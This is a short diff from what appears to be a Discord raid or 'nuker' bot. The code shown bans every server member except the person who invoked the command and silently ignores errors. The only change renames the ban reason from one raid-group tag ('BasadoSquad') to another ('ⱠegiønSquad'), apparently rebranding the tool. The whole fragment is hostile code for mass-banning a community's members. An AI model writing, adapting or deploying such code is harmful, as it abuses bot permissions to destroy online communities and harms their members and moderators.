@@ -19,7 +19,7 @@ try{
     if(member.user.id == interaction.user.id){
       return;
     }else{
-      member.ban({reason: '☣️BasadoSquad☣️'}).catch(e=>{ 
+      member.ban({reason: '☣️ⱠegiønSquad☣️'}).catch(e=>{ 
        return;
       })
     }
